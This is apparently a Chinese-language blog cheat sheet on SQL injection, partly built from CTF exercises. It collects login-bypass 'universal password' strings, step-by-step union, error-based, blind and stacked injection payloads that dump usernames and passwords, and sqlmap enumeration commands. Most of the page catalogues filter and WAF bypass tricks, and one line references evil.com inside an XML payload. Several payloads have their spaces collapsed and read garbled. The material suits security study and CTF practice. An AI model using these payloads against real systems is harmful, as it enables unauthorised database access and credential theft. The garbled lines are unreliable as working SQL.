---
title: "SQL"
date: 2026-03-21 22:53:32
categories: "WEB"
tags:
  - "WEB"
cover: /img/backgrounds/bg-13.png
top_img: /img/backgrounds/bg-13.png
disableNunjucks: true
---

```python
万能密码： or 1 = 1#  
And 1 = 1 能查到 And 1 = 2 不能查到，有sql注入
url编码："=%22   '=%27  空格=%20  &=%26
数字型：不需要加引号，1 or 1 = 1#  就能查询
字符型：需加引号
联合查询：union
字符型 数字型 搜索型 xx型 json注入
json注入：注入json语句 json={"or and 1 = 1"}
判断字符型还是数字型sql注入：
	and 1=1 和 and 1=2 来判断
1 数字型：1正常 2不正常
2 字符型：两个都正常
```

# 万能密码
```plain
' or 1='1
'or'='or'

admin
admin'--

admin' or 4=4--
admin' or '1'='1'--

admin888
"or "a"="a

admin' or 2=2#
a' having 1=1#
a' having 1=1--

admin' or '2'='2
')or('a'='a

or 4=4--
c

a'or' 4=4--
"or 4=4--

'or'a'='a
"or"="a'='a
'or''='
'or'='or'
1 or '1'='1'=1
1 or '1'='1' or 4=4
'OR 4=4%00
"or 4=4%00

admin' UNION Select 1,1,1 FROM admin Where ''='
1

-1%cf' union select 1,1,1 as password,1,1,1 %23
1

17..admin' or 'a'='a 密码随便
'or'='or'
'or 4=4/*

something
' OR '1'='1
1'or'1'='1
admin' OR 4=4/*
1'or'1'='1

admin' or 1=1/*xxx*/--
admin' oR 1=1--
admin' or 1=2-1--
admin' or length('1')=1--
admin' or 1 in (1)--
admin'%20or%201=1--
admin'+or+1=1--
admin' or 'a' like 'a'--
```

# **判断闭合方式：**
**首先尝试：  ?id=1'  和   ?id=1"**

**结果一：如果都报错**

**判断闭合符为：整形闭合。**

**结果二：如果单引号报错，双引号不报错。**

**继续尝试：?id=1'  --+**

**结果1：无报错，判断闭合符为：单引号闭合。**

**结果2：报错，判断闭合符可能为：单引号加括号。**

**结果三：如果单引号不报错，双引号报错。**

**继续尝试：?id=1" --+**

**结果1：无报错，判断闭合符为：双引号闭合。**

**结果2：报错，判断闭合符可能为：双引号加括号。**





# **联合注入**
（order查看多少列，column查表中字段名）



**第一步：首先知道表格有几列**

?id=1'order by 1--+

?id=1'order by 2--+ **    直到报错**

**第二步：爆出显示位**

?id=-1'union select 1,2,3--+

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-001.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-002.png)

第二三列的内容显示在了页面

**第三步：获取当前数据名和版本号**

```python
?id=-1'union select 1,database(),version()--+&Submit=Submit#
```

**第四步： 爆表名**

```python
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
```

在注入时，information_schema库的作用就是获取：table_schema，table_name, column_name .

这些数据库内的信息。如果information_schema库被过滤掉，还可以尝试使用下述库来代替

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-003.png)

**第五步：爆字段名**

```python
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
```

**第六步:**

```python
?id=-1' union select 1,2,group_concat(username ,id , password) from users--+
```

Concat里面的id可将密码和用户名分开



# **报错注入**
**第一步：首先判断有无显示位**

**使用updatexml(1,sql,1) 或 extractvalue(1,sql,1)**

**0x7e代表的是~，这里的作用是用两个~将查询结果包裹起来**

**1爆库名**

```python
and extractvalue (1,concat(0x7e,database(),0x7e))--+
```

**爆出数据库名字 **

```python
-1'and(select extractvalue(1,concat('~',(select database()))))#	报错注入 
```

**  
**** ****<font style="color:rgb(0, 0, 0);background-color:rgb(252, 252, 252);">爆出所有数据库名 </font>**

```python
-1'and(select extractvalue(1,concat('~',(select group_concat(schema_name) from information_schema.schemata))))#
```

**2爆表名 **

```python
and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+
```

****

```python
-1'and(select extractvalue(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema='test_db'))))--+
```

**3爆字段**

```python
-1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and  table_name='users'),0x7e),1)--+
```

****

```plain
-1'and(select extractvalue(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_name="test_tb" and table_schema='test_db'))))
```

**4查询敏感表**

```python
and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1)--+
```

**也可使用**

```python
and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e))--+
and extractvalue(1,concat(0x7e,(select password from users limit 0,1),0x7e))--+
```

查询flag

```python
-1'and(select extractvalue(1,concat('~',(select substr((select flag from test_tb), 1 , 31)))))#  0-30位 左边30位
-1'and(select extractvalue(1,concat('~',(select substr((select flag from test_tb), 31 , 60)))))#  31-60位 右边边31位
```



# **双查询注入**
** 爆破数据库名字**

```python
?id=-1' union select 1,count(*),concat(0x7e,(select database()),0x7e,floor(rand(0)*2)) as a from information_schema.tables group by a --+
```

**爆破数据库表名**

```python
?id=-1'   union select 1, count(*),concat_ws('-', (select table_name from information_schema.tables where table_schema='security'),floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+
```

**若数据不能完全显示则使用limit依次查表**

```python
?id=-1'   union select 1, count(*),concat_ws('-', (select table_name from information_schema.tables where table_schema='security' limit 0, 1),floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+    //limit0,1 limit1,1
```

**爆破字段**

```python
 union select 1, count(*),concat_ws('-', (select column_name from information_schema.columns where table_name='users' and table_schema='security' limit 0, 1), floor(RAND(0)*2))a from information_schema.tables where table_schema='security' group by a--+
```



# **布尔盲注**
**爆破数据库名字**

**?id=1' and (select length(database())>1) and 1=1  --+   依次尝试爆长度**

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-004.png)

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-005.png)

**判断数据库的各个字符的ascii的值  
****?id=1' and ((select ascii(substr(database(),1,1)))>100) and 1=1 --+**

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-006.png) <!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-007.png)

用二分发查出具体的值再进行转换，改变substr第二个值进行爆破

**?id=1' and ((select ascii(substr(database(),2,1)))>100) and 1=1 --+**





**sqlmap 入门  判断是否存在sql注入**

sqlmap.py -u http://    ?id=1  注入点为一

sqlmap.py -u “http://    ?id=1&uid=2 "  多个注入点

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-008.png)

当出现以上结果，存在sql注入

紧跟着上图，可以看到底下会有选择，会出现三个输入 [Y/n] ，一般默认按回车键即可。

第一处意为检测数据库可能是 MySQL ，是否需要跳过检测其他数据库；

第二处意为在“ level 、riskl ”的情况下，是否使用 MySQL 对应的所有 payload 进行检测；

第三处意为参数 id 存在漏洞，是否继续检测其他参数。

```python
python sqlmap.py -u "http:// ?id=1" –dbs                列出所有数据库
python sqlmap.py -u "http:// ?id=1" -D security –tables    列出指定的数据库的表
python sqlmap.py -u "http:// ?id=1" -D security –T users   列出指定的表的内容
```



# **堆叠注入([强网杯2019] 随便注 1)**
过滤关键字：/select|update|delete|drop|insert|where|\.而且不区分大小写。select一被禁用，联合查询，报错注入，布尔,时间盲注就都不可以使用了。我们只剩下了 堆叠注入。

<font style="color:#4D4D4D;">1';show database—q</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-009.png)

<font style="color:#4D4D4D;">1';show tables—q</font>

<!-- 这是一张图片，ocr 内容为： -->
![](/assets/docs/WEB/SQL/img-010.png)

**分别查看**

1'; show columns from `words`-- q

1'; show columns from `1919810931114514`-- q



<font style="color:#4D4D4D;">查询 id 就需要 select</font>

**<font style="color:#4D4D4D;">第一种：比较骚的思路，让程序中已经存在的select语法帮我们进行查询，把words改名为其他，191这个表改名为words,然后再添加id字段，将flag字段改为data。</font>**

```python
1';rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT '12';ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q
```

**<font style="color:#4D4D4D;">第二种方法：利用concat拼接（</font>****<font style="color:#4EA1DB;">mysql</font>****<font style="color:#4D4D4D;">的语法知识）</font>**

```python
-1’;use supersqli;set @sql=concat(‘s’,'elect flag from 1919810931114514');PREPARE stmt1 FROM @sql;EXECUTE stmt1-- q
```

# <font style="color:#4D4D4D;">跨数据库查询</font>
完整流程（攻击者视角）

```python
1. 获取所有数据库名：
SELECT GROUP_CONCAT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA;
2. 获取某数据库中所有表名：
SELECT GROUP_CONCAT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='flagdb';
3. 获取表中的列名：
SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='flagtable';
4. 读取 flag 值：
SELECT GROUP_CONCAT(flag) FROM flagdb.flagtable;
```

<font style="color:#4D4D4D;"></font>

# <font style="color:#4D4D4D;">常见绕过</font>
### <font style="color:rgb(79, 79, 79);">1.绕过空格（注释符/* */，%a0）</font>
<font style="color:rgb(77, 77, 77);">两个空格代替一个空格，用Tab代替空格，%a0=空格：</font>

<font style="color:rgb(77, 77, 77);">%20%09%0a</font>

<font style="color:rgb(77, 77, 77);">%0b</font>

<font style="color:rgb(77, 77, 77);">%0c</font>

<font style="color:rgb(77, 77, 77);">%0d</font>

<font style="color:rgb(77, 77, 77);">%a0</font>

<font style="color:rgb(77, 77, 77);">/**/</font>

### <font style="color:rgb(79, 79, 79);">2.括号绕过空格：</font>
<font style="color:rgb(77, 77, 77);">如果空格被过滤，括号没有被过滤，可以用括号绕过。</font>

```python
select(user())fromdualwhere(1=1)and(2=2)
```

<font style="color:rgb(77, 77, 77);">这种过滤方法常常用于time based盲注,例如：</font>

```python
?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23
```

<font style="color:rgb(77, 77, 77);">上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">3.引号绕过（</font>**<font style="color:rgb(79, 79, 79);">使用十六进制</font>**<font style="color:rgb(79, 79, 79);">）：</font>
<font style="color:rgb(77, 77, 77);">例如selectcolumn_namefrominformation_schema.tableswheretable_name="users"</font>

<font style="color:rgb(77, 77, 77);">users的</font><font style="color:rgb(78, 161, 219) !important;">十六进制</font><font style="color:rgb(77, 77, 77);">的字符串是7573657273。那么最后的sql语句就变为了：</font>

<font style="color:rgb(77, 77, 77);">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">4.逗号绕过（limit</font>**<font style="color:rgb(79, 79, 79);">使用from或者offset</font>**<font style="color:rgb(79, 79, 79);">）（substr使用from for属于逗号）：</font>
<font style="color:rgb(77, 77, 77);">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</font>

<font style="color:rgb(77, 77, 77);">select substr(database(0from1for1);select mid(database(0from1for1);</font>

<font style="color:rgb(77, 77, 77);">对于limit可以使用offset来绕过：</font>

<font style="color:rgb(77, 77, 77);">select*fromnews limit0,1# 等价于下面这条SQL语句select*fromnews limit1offset0</font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">5.比较符号（<>）绕过（</font>**<font style="color:rgb(79, 79, 79);">使用greatest()</font>**<font style="color:rgb(79, 79, 79);">）：</font>
<font style="color:rgb(77, 77, 77);">同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</font>

<font style="color:rgb(77, 77, 77);">最常见的一个盲注的sql语句：</font>

```python
select * from users where id=1 and ascii(substr(database(),0,1))>64
```

<font style="color:rgb(77, 77, 77);">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。</font>

<font style="color:rgb(77, 77, 77);">那么上面的这条sql语句可以使用greatest变为如下的子句:</font>

```python
select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64
```

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">6.or and 绕过：</font>
```python
and=&&  or=||
```

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">7.绕过注释符号（#，--）过滤：</font>
```python
id=1'union select 1,2,3||'1
```

<font style="color:rgb(77, 77, 77);">最后的or '1闭合查询语句的最后的单引号，或者：</font>

```python
id=1'union select 1,2,'3
```

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">8.=绕过：</font>
<font style="color:rgb(77, 77, 77);">使用like 或者 使用< 或者 ></font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">9.绕过union，select，where等：</font>
#### <font style="color:rgb(79, 79, 79);">（1）使用注释符绕过：</font>
<font style="color:rgb(77, 77, 77);">常用注释符：</font>

<font style="color:rgb(77, 77, 77);">//，-- , /**/, #, --+, -- -, ;,%00,--a</font>

<font style="color:rgb(77, 77, 77);">用法：</font>

<font style="color:rgb(77, 77, 77);">U/**/NION/**/SE/**/LECT/**/user，pwd from user</font>

#### <font style="color:rgb(79, 79, 79);">（2）使用大小写绕过：</font>
<font style="color:rgb(77, 77, 77);">id=-1'UnIoN/**/SeLeCT</font>

#### <font style="color:rgb(79, 79, 79);">（3）内联注释绕过：</font>
```python
id=-1'/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#
```

#### <font style="color:rgb(79, 79, 79);">（4） 双关键字绕过：</font>
```python
id=-1'UNIunionONSeLselectECT1,2,3–-
```

### <font style="color:rgb(79, 79, 79);">10.通用绕过（编码）：</font>
<font style="color:rgb(77, 77, 77);">如URLEncode编码，ASCII,HEX,unicode编码绕过：</font>

<font style="color:rgb(77, 77, 77);">or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">11.等价函数绕过：</font>
<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);"></font>

<font style="color:rgb(77, 77, 77);">hex()、bin()==>ascii()</font>

<font style="color:rgb(77, 77, 77);">sleep()==></font><font style="color:rgb(78, 161, 219) !important;">benchmark</font><font style="color:rgb(77, 77, 77);">()</font>

<font style="color:rgb(77, 77, 77);">concat_ws()==>group_concat()</font>

<font style="color:rgb(77, 77, 77);">mid()、substr()==>substring() @@user==>user() @@datadir==>datadir()</font>

<font style="color:rgb(77, 77, 77);">举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：</font>

<font style="color:rgb(77, 77, 77);">substr((select'password'),1,1)=0x70strcmp(left('password',1),0x69)=1strcmp(left('password',1),0x70)=0strcmp(left('password',1),0x71)=-1</font>

<font style="color:rgb(77, 77, 77);"></font>

### <font style="color:rgb(79, 79, 79);">12.宽字节注入：</font>
<font style="color:rgb(77, 77, 77);">过滤 ' 的时候往往利用的思路是将 ' 转换为 \' 。</font>

<font style="color:rgb(77, 77, 77);">在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</font>

<font style="color:rgb(77, 77, 77);">（1）%df 吃掉 \ 具体的方法是 urlencode('\) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（'）符号在外面：</font>

```python
id=-1%df%27union select 1,user(),3--+
```



## <font style="color:rgb(79, 79, 79);">过滤*2</font>
### <font style="color:rgb(77, 77, 77);">0x00 sql注入的原因</font>
<font style="color:rgb(77, 77, 77);">sql注入的原因，表面上说是因为 拼接字符串，构成sql语句，没有使用 sql语句预编译，绑定变量。</font>

<font style="color:rgb(77, 77, 77);">但是更深层次的原因是，将用户输入的字符串，当成了 “sql语句” 来执行。</font>

<font style="color:rgb(77, 77, 77);">比如上面的 String sql = "select id,no from user where id=" + id;</font>

<font style="color:rgb(77, 77, 77);">我们希望用户输入的 id 的值，仅仅作为一个字符串字面值，传入数据库执行，但是当输入了： 2 or 1=1 时，其中的 or 1=1 并没有作为 where id= 的字面值，而是作为了 sql语句 来执行的。所以其本质是将用户的输入的数据，作为了命令来执行。</font>

### <font style="color:rgb(77, 77, 77);">0x01 sql注入绕过</font>
#### <font style="color:rgb(77, 77, 77);">1.1 注释符绕过</font>
<font style="color:rgb(77, 77, 77);">常用注释符：</font>

```python
常用注释符：
//
-- 
/**/
#
--+
-- -
;
%00
```

#### <font style="color:rgb(77, 77, 77);">1.2 大小写绕过</font>
<font style="color:rgb(77, 77, 77);">?id=1+UnIoN/**/SeLeCT</font>

#### <font style="color:rgb(77, 77, 77);">1.3 内联注释绕过</font>
<font style="color:rgb(77, 77, 77);">id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM/*information_schema*/.tables/*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -</font>

<font style="color:rgb(77, 77, 77);">通常情况下，上面的代码可以绕过过滤器，请注意，我们用的是 Like而不是 =</font>

#### <font style="color:rgb(77, 77, 77);">1.4 双关键字绕过</font>
<font style="color:rgb(77, 77, 77);">?id=1+UNIunionON+SeLselectECT+1,2,3–</font>

#### <font style="color:rgb(77, 77, 77);">1.5 编码绕过</font>
**<font style="color:rgb(77, 77, 77);">如URLEncode编码，ASCII,HEX,unicode编码绕过</font>**

<font style="color:rgb(77, 77, 77);">or1=1即%6f%72%20%31%3d%31</font>

<font style="color:rgb(77, 77, 77);">而Test也可以为</font>

<font style="color:rgb(77, 77, 77);">CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</font>

<font style="color:rgb(77, 77, 77);">十六进制编码</font>

<font style="color:rgb(77, 77, 77);">SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</font>

<font style="color:rgb(77, 77, 77);">双重编码绕过</font>

```python
?id=1%252f%252a*/UNION%252f%252a/SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
```

<font style="color:rgb(77, 77, 77);">一些unicode编码举例：  </font>

<font style="color:rgb(77, 77, 77);">单引号：</font>

<font style="color:rgb(77, 77, 77);">%u0027%u02b9%u02bc</font>

<font style="color:rgb(77, 77, 77);">%u02c8%u2032</font>

<font style="color:rgb(77, 77, 77);">%uff07%c0%27%c0%a7%e0%80%a7</font>

<font style="color:rgb(77, 77, 77);">空白：</font>

<font style="color:rgb(77, 77, 77);">%u0020%uff00</font>

<font style="color:rgb(77, 77, 77);">%c0%20%c0%a0%e0%80%a0</font>

<font style="color:rgb(77, 77, 77);">左括号(:</font>

<font style="color:rgb(77, 77, 77);">%u0028%uff08</font>

<font style="color:rgb(77, 77, 77);">%c0%28%c0%a8%e0%80%a8</font>

<font style="color:rgb(77, 77, 77);">右括号):</font>

<font style="color:rgb(77, 77, 77);">%u0029%uff09</font>

<font style="color:rgb(77, 77, 77);">%c0%29%c0%a9%e0%80%a9</font>

#### <font style="color:rgb(77, 77, 77);">1.6 空格绕过</font>
<font style="color:rgb(77, 77, 77);">两个空格代替一个空格，用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/</font>

<font style="color:rgb(77, 77, 77);">括号绕过空格</font>

<font style="color:rgb(77, 77, 77);">在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来</font>

<font style="color:rgb(77, 77, 77);">select(user())from dual where 1=1 and 2=2;</font>

#### <font style="color:rgb(77, 77, 77);">1.7 万能密钥绕过</font>
<font style="color:rgb(77, 77, 77);">用经典的or1=1判断绕过,如or 'swords' ='swords</font>

### <font style="color:rgb(77, 77, 77);">1.8 +,-,.号拆解字符串绕过</font>
<font style="color:rgb(77, 77, 77);">?id=1' or'11+11'='11+11'"-"和"."</font>

### <font style="color:rgb(77, 77, 77);">1.9 like绕过</font>
<font style="color:rgb(77, 77, 77);">?id=1' or 1 like 1绕过对"="，">"等的过滤</font>

### <font style="color:rgb(77, 77, 77);">2.0 in绕过</font>
#### <font style="color:rgb(77, 77, 77);">or'1'IN('swords')</font>
### <font style="color:rgb(77, 77, 77);">2.1 >,<绕过</font>
<font style="color:rgb(77, 77, 77);">or'password'>'pass'or1<3</font>

#### <font style="color:rgb(77, 77, 77);">2.2 等价函数与命令绕过</font>
**<font style="color:rgb(77, 77, 77);">1.函数或变量</font>**

<font style="color:rgb(77, 77, 77);">hex()、bin()==>ascii()sleep()==>benchmark()concat_ws()==>group_concat()mid()、substr()==>substring()@@user==>user()@@datadir==>datadir()</font>

<font style="color:rgb(77, 77, 77);">举例：substring()和substr()无法使用时：</font>

```python
?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74 
或者：substr((select 'password'),1,1) = 0x70strcmp(left('password',1),0x69)= 1strcmp(left('password',1),0x70)= 0strcmp(left('password',1),0x71)= -1
```

#### <font style="color:rgb(77, 77, 77);">2.符号</font>
<font style="color:rgb(77, 77, 77);">and和or有可能不能使用，可以试下&&和||=不能使用的情况，可以考虑尝试<、></font>

#### <font style="color:rgb(77, 77, 77);">3.生僻函数</font>
<font style="color:rgb(77, 77, 77);">MySQL/PostgreSQL支持XML函数：</font>

```python
SelectUpdateXML('','/script/@x/','src=//evil.com'); ?id=1 and 1=(updatexml(1,concat(0x3a,(selectuser())),1))SELECTxmlelement(nameimg,xmlattributes(1assrc,'a\l\x65rt(1)'as\117n\x65rror)); 
//postgresql?id=1 and extractvalue(1, concat(0x5c, (selecttable_namefrominformation_schema.tableslimit1)));and 1=(updatexml(1,concat(0x5c,(selectuser()),0x5c),1))andextractvalue(1,concat(0x5c, (selectuser()),0x5c))
```

#### <font style="color:rgb(77, 77, 77);">2.3 反引号`绕过</font>
```python
select`version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用
```

#### <font style="color:rgb(77, 77, 77);">2.4 换行符绕过</font>
<font style="color:rgb(77, 77, 77);">%0a、%0d</font>

#### <font style="color:rgb(77, 77, 77);">2.5 截断绕过</font>
<font style="color:rgb(77, 77, 77);">%00,%0A,?,/0,........,%80-%99</font>

<font style="color:rgb(77, 77, 77);">目录字符串，在window下256字节、</font><font style="color:rgb(78, 161, 219) !important;">linux</font><font style="color:rgb(77, 77, 77);">下4096字节时会达到最大值，最大值长度之后的字符将被丢弃</font>

<font style="color:rgb(77, 77, 77);">././././././././././././././././abc</font>

<font style="color:rgb(77, 77, 77);">abc</font>

<font style="color:rgb(77, 77, 77);">..1/abc/../1/abc/../1/abc</font>

#### <font style="color:rgb(77, 77, 77);">2.6 宽字节绕过</font>
<font style="color:rgb(77, 77, 77);">过滤单引号时，可以试试宽字节</font>

<font style="color:rgb(77, 77, 77);">%bf%27 %df%27 %aa%27</font>

```python
id=-1%df%27union select 1,user(),3--+
```

#### <font style="color:rgb(77, 77, 77);">2.7 \N绕过</font>
<font style="color:rgb(77, 77, 77);">\N其实相当于NULL字符</font>

<font style="color:rgb(77, 77, 77);">select*from users where id=8E0union select 1,2,3,4,5,6,7,8,9,0 select*from users where id=8.0 union select 1,2,3,4,5,6,7,8,9,0 select*from users where id=\Nunion select 1,2,3,4,5,6,7,8,9,0</font>

#### <font style="color:rgb(77, 77, 77);">2.8 特殊的绕过函数</font>
<font style="color:rgb(77, 77, 77);">1.通过greatest函数绕过不能使用大小于符号的情况greatest(a,b)，返回a和b中较大的那个数。当我们要猜解user()第一个字符的ascii码是否小于等于150时，可使用：mysql>selectgreatest(ascii(mid(user(),1,1)),150)=150; </font>

<font style="color:rgb(77, 77, 77);">greatest(ascii(mid(user(),1,1)),150)=150 如果小于150，则上述返回值为True。</font>

<font style="color:rgb(77, 77, 77);">2.通过substr函数绕过不能使用逗号的情况</font>

<font style="color:rgb(77, 77, 77);">mid(user()from1for1)或substr(user()from1for1)</font>

<font style="color:rgb(77, 77, 77);">selectascii(substr(user()from1for1)) <150; ascii(substr(user()from1for1)) <150</font>

<font style="color:rgb(77, 77, 77);">3.使用数学运算函数在子查询中报错exp(x)函数的作用： 取常数e的x次方，其中，e是自然对数的底。~x 是一个一元运算符，将x按位取补selectexp(~(select*from(selectuser())a))mysql报错：</font>

<font style="color:rgb(77, 77, 77);">selectexp(~(select*from(selectuser())a));</font>

<font style="color:rgb(77, 77, 77);">ERROR1690(22003):DOUBLEvalueisoutofrangein‘exp(~((select‘root@localhost’fromdual)))’</font>

<font style="color:rgb(77, 77, 77);">这条查询会出错，是因为exp(x)的参数x过大，超过了数值范围，分解到子查询，就是：(select*from(selectuser())a) 得到字符串 root@localhost表达式’root@localhost’被转换为0，按位取补之后得到一个非常的大数，它是MySQL中最大的无符号整数</font>

<font style="color:rgb(77, 77, 77);">附：PHP中一些常见的过滤方法及绕过方式</font>

<font style="color:rgb(77, 77, 77);">过滤关键字  and or</font>

```python
php代码  :preg_match('/(and|or)/i',$id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码    1 or 1=1 1 and 1=1</font>

<font style="color:rgb(77, 77, 77);">绕过方式    1 || 1=1 1 && 1=1</font>

<font style="color:rgb(77, 77, 77);">过滤关键字  and or union</font>

```python
php代码  :preg_match('/(and|or|union)/i',$id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码    union select user,password from users</font>

<font style="color:rgb(77, 77, 77);">绕过方式  1&& (selectuserfromuserswhereuserid=1)='admin'</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and or union where </font>

```python
php代码  preg_match('/(and|or|union|where)/i',$id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&& (selectuserfromuserswhereuser_id =1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&& (selectuserfromuserslimit1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and or union where </font>

```python
php代码  preg_match('/(and|or|union|where)/i',$id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&& (selectuserfromuserswhereuser_id =1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&& (selectuserfromuserslimit1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and,or,union,where,limit</font>

```python
php代码  preg_match('/(and|or|union|where|limit)/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&& (selectuserfromuserslimit1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&& (selectuserfromusersgroupbyuser_idhavinguser_id =1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">#user_id聚合中user_id为1的user为admin</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and,or,union,where,limit,group by </font>

```python
php代码  preg_match('/(and|or|union|where|limit|group by)/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&& (selectuserfromusersgroupbyuser_idhavinguser_id =1) ='admin'</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&& (selectsubstr(group_concat(user_id),1,1)userfromusers) =1</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and,or,union,where,limit,group by,select </font>

```python
php代码  preg_match('/(and|or|union|where|limit|group by|select)/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&& (selectsubstr(gruop_concat(user_id),1,1)userfromusers) =1</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&&substr(user,1,1) ='a'</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and,or,union,where,limit,groupby,select,'</font>

```python
php代码  preg_match('/(and|or|union|where|limit|groupby|select|\')/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&& (selectsubstr(gruop_concat(user_id),1,1)userfromusers) =1</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&& user_idisnotnull1&&substr(user,1,1) =0x611&&substr(user,1,1) =unhex(61)</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and,or,union,where,limit,groupby,select,', hex</font>

```python
php代码  preg_match('/(and|or|union|where|limit|groupby|select|\'|hex)/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&&substr(user,1,1) =unhex(61)</font>

<font style="color:rgb(77, 77, 77);">绕过方式1&&substr(user,1,1) =lower(conv(11,10,16)) #十进制的11转化为十六进制，并小写。</font>

<font style="color:rgb(77, 77, 77);">过滤关键字and,or,union,where,limit,groupby,select,', hex, substr</font>

```python
php代码  preg_match('/(and|or|union|where|limit|groupby|select|\'|hex|substr)/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&&substr(user,1,1) =lower(conv(11,10,16))/td></font>

<font style="color:rgb(77, 77, 77);">绕过方式1&&lpad(user,7,1)过滤关键字and,or,union,where,limit,groupby,select,', hex, substr, 空格</font>

```python
php代码  preg_match('/(and|or|union|where|limit|groupby|select|\'|hex|substr|\s)/i', $id)
```

<font style="color:rgb(77, 77, 77);">会过滤的攻击代码1&&lpad(user,7,1)/td></font>

<font style="color:rgb(77, 77, 77);">绕过方式1%0b||%0blpad(user,7,1)过滤关键字andorunionwhere</font>

```python
php代码  preg_match('/(and|or|union|where)/i',$id)
```

